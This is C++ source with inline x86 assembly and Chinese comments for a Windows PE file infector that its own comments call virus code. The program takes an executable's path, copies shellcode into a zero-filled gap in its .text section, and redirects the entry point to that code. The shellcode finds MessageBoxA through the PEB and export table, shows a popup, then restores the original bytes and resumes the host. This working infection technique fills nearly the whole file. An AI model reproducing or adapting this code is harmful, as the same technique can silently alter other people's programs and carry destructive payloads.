// Win-入口跳转弹窗.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include<windows.h>
#include<cstdio>

const int PEtoEntryPoint = 0x28;//入口点相对于PE头的偏移
const int textCharacteristics = 0x24;
int PEHeadOffset, EntryPoint, textOffset, textRVA, textFO, textSize, textVK, zeroOffset, ImageBase, iVirusSize = 0;
PVOID pvFile = NULL;

TCHAR* CreateCode()
{
	int VirusStart, VirusEnd;
	_asm{
		mov VirusStart, offset virus_start
			mov VirusEnd, offset virus_end
	}
	iVirusSize = VirusEnd - VirusStart;
	TCHAR* pCode = (TCHAR *)malloc(iVirusSize);
	if (NULL == pCode)
	{
		return 0;
	}

	memcpy(pCode, (void *)VirusStart, iVirusSize);
	*(int *)((char *)pCode+5) = 22;//填写所比较的字符串的长度
	wcscpy((TCHAR *)((char *)pCode + 9), L"USER32.dll");
	strcpy((char *)((char *)pCode + 31), "MessageBoxA");
	memcpy((char *)((char *)pCode + 43), (char *)((PSTR)pvFile + EntryPoint - textVK), 5);//填写原入口点被覆盖的5字节
	*(int *)((char *)pCode + 48) = ImageBase + EntryPoint;//填写起始地址VA

	return pCode;

virus_start:
	_asm{
		call yy
		//字符串长度
		nop
		nop
		nop
		nop
		////USER32.dll的Unicode字符串
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		///MessageBoxA字符串 长度为12
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		/////
		//存放起始入口点的5字节数据
		nop
		nop
		nop
		nop
		nop
		//存放起始入口地址
		nop
		nop
		nop
		nop
		
	yy:
		pop ecx//ECX存放当前地址
		push ecx//esp+8h就可以找到当前地址
		mov eax, fs:[30h]
		mov eax, [eax + 0ch]
		mov eax, [eax + 0ch]
		mov edx, eax//edx存放第一个
		push edx//esp+4h可以找到第一个PEB结构的地址，用来对比是否已经遍历完了整个链表，但是我这里懒没有写判断的代码
		push eax//暂时保存eax
	find:
		pop eax//还原eax
		mov eax, [eax] //指向下一个PEB结构
		push eax//暂时保存eax
		mov ecx, [esp + 8h]//ecx指向代码首地址
		mov ebx, [eax+30h]//PEB结构中偏移30h的地方就是DLL的名字
		push ebx
		push [ecx]//这里传入要找的DLL文件长度，注意这是Unicode字符串
		mov ebx,ecx
		add ebx,4
		push ebx//这里传入要找的DLL文件地址，
		call CmpStr
		add esp,0xc//平衡堆栈
		test eax,eax
		jz find
		jmp FindOut
	CmpStr://入栈顺序 字符串1 长度 字符串2
		mov ecx, [esp+8h]//字符串的长度
		mov edi, [esp+4h]//第一个字符串
		mov esi, [esp+0xc]//第二个字符串
		xor eax,eax
		cld
		repz cmpsb
		test ecx,ecx
		jz same
		ret
	same:
		inc eax
		ret

	FindOut:
		pop eax//还原eax
		add esp,4h//还原堆栈到初始值,此时栈中只留下病毒代码的首地址
		mov eax, [eax+18h]//此时eax=user32.dll在内存中的首地址
		mov ebx, [eax+10ch]//加上基址则ebx即为导出表的VA
		push ebx//保存user32.dll的基址
		add ebx, [eax + 150h]//user32.dll偏移150h的地方存放了导出表的RVA
		mov edx, [ebx+20h]//导出表偏移20h为导出函数名的地址表RVA
		add edx, [esp]//加上基址

		push 0//保存字符串指针MessageBoxA在表中排第几位
	findUser32:
		mov ecx, [esp+8h]
		add ecx,26
		push ecx
		push 12//MessageBox字符串的长度
		mov ecx,[edx]
		add ecx, [esp+0xc]//加上基址
		push ecx
		call CmpStr
		add esp, 0xc//平衡堆栈
		add edx,4
		mov esi, [esp]
		add esi,1
		mov [esp],esi
		test eax,eax
		jz findUser32
		//执行到这里时已经找到了MessageBoxA在导出函数名称指针表中在第几位，保存在栈顶
		pop eax
		dec eax
		push eax
		//因为上面找到MessageBoxA所在的位置后，任然让计数器加了1，所以偏移多了一位，故减去一位

		mov eax, [esp+4h]//eax=user32.dll在内存中的首地址
		mov eax, [eax+150h]//eax=导出表的RVA
		add eax, [esp+4h]//eax=导出表的VA
		mov ebx, [eax+24h]
		add ebx, [esp+4h]//ebx=序号表的VA
		pop eax//eax=MessageBoxA在函数名称指针表中在第几位
		mov ecx,2h
		mul ecx//序号表一项两字节
		add ebx,eax//ebx=MessageBoxA在序号表的VA
		xor ecx,ecx
		mov cx, word ptr[ebx]//ecx=MessageBoxA在地址表中第几位

		mov eax, [esp]////eax=user32.dll在内存中的首地址
		mov eax, [eax + 150h]//eax=导出表的RVA
		add eax, [esp]//eax=导出表的VA
		mov ebx, [eax + 1ch]
		add ebx, [esp]//ebx=导出函数地址表VA
		mov eax,4h
		mul ecx
		add ebx,eax//ebx=MessageBoxA在导出函数地址表中的VA
		mov edx, [ebx]//edx=MessageBoxA的RVA
		add edx, [esp]//edx=MessageBoxA的VA

		//为了简单，弹窗的字符串我就用病毒代码已有的“MessageBoxA”，“USER32.dll”不能用，因为是Unicode字符串
		mov eax, [esp+4h]
		add eax,26
		push 0
		push eax
		push eax
		push 0
		call edx

		mov eax, [esp+4h]//eax=病毒代码起始VA
		mov ebx, [eax+38]//ebx=要恢复的字符串前4字节
		mov ecx, [eax+43]//原入口VA
		mov [ecx],ebx
		mov dl, byte ptr[eax+42]//恢复最后一个字节
		mov byte ptr[ecx+4],dl
		add esp,8//还原堆栈
		jmp ecx
		




	}
virus_end:
	;
}
int findZero(PVOID file, int start, int size)//查找一块连续128字节都是0的区域
{
	bool OK = true;
	while (1)
	{
		OK = true;
		for (int i = 0; i < size; i++)
		{
			if (0 != *((PSTR)file + start + i))
			{
				OK = false;
				break;
			}
		}
		if (OK)
		{
			return start;
		}
		else
		{
			start++;
		}
	}
}
int findSection(char *name, PVOID file, int start)//找到PE头中名字为*name的区段的描述信息的文件偏移
{
	//int offset = start;
	bool OK;
	while (1)
	{
		OK = true;
		for (int i = 0;; i++)
		{
			if (*(name + i) == '\0'&&*((PSTR)file + i + start) == '\0')
				break;
			if (*(name + i) != *((PSTR)file + i + start))
			{
				OK = false;
				break;
			}
		}
		if (OK)
		{
			return start;
		}
		else
		{
			start++;
		}
	}
}
int _tmain(int argc, _TCHAR* argv[])
{
	TCHAR szBuf[512];
	wscanf_s(L"%ls", szBuf, _countof(szBuf));
	HANDLE hNormalFile = CreateFile(szBuf, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hNormalFile)
	{
		printf("打开文件出错,错误代码%d", GetLastError());
	}
	DWORD dwFileSize = GetFileSize(hNormalFile, NULL);
	HANDLE hFileMap = CreateFileMapping(hNormalFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);
	if (NULL == hFileMap)
	{
		printf("创建内存映射文件失败,错误代码%d", GetLastError());
	}
	pvFile = MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (NULL == pvFile)
	{
		printf("映射文件失败,错误代码%d", GetLastError());
	}

	PEHeadOffset = *(int *)((PSTR)pvFile + 0x3c);
	EntryPoint = *(int *)((PSTR)pvFile + PEHeadOffset + PEtoEntryPoint);
	//PE头偏移0x78是DataDirectory字段，DataDirectory字段包含16条信息，每条8字节
	//textVK = *(int *)((PSTR)pvFile + PEHeadOffset + 0x78+16*8+)
	textOffset = findSection(".text", pvFile, 0);
	textRVA = *(int *)((PSTR)pvFile + textOffset + 12);//区段表中起始偏移12字节处为该区段的RVA
	textFO = *(int *)((PSTR)pvFile + textOffset + 20);//区段表中起始偏移20字节处为该区段的File Offset
	textSize = *(int *)((PSTR)pvFile + textOffset + 16);//偏移16字节为该区段在文件中对齐后的尺寸
	textVK = textRVA - textFO;
	ImageBase = *(int *)((PSTR)pvFile + PEHeadOffset + 0x34);
	zeroOffset = findZero(pvFile, textFO, 80);//需要复制的代码有71字节

	TCHAR *code = CreateCode();
	memcpy((PSTR)pvFile + zeroOffset, code, iVirusSize);

	//修改原入口点，跳转至病毒代码
	*((PSTR)pvFile + EntryPoint - textVK) = 0xe9;
	*(int *)((PSTR)pvFile + EntryPoint - textVK + 1) = (zeroOffset - textVK) - (EntryPoint - textVK) - 5;

	//修改.text区段属性为可读可写
	int Characteristics = *(int *)((PSTR)pvFile + textOffset + textCharacteristics);
	Characteristics |= 0x80000000;
	*(int *)((PSTR)pvFile + textOffset + textCharacteristics) = Characteristics;

	UnmapViewOfFile(pvFile);
	return 0;
}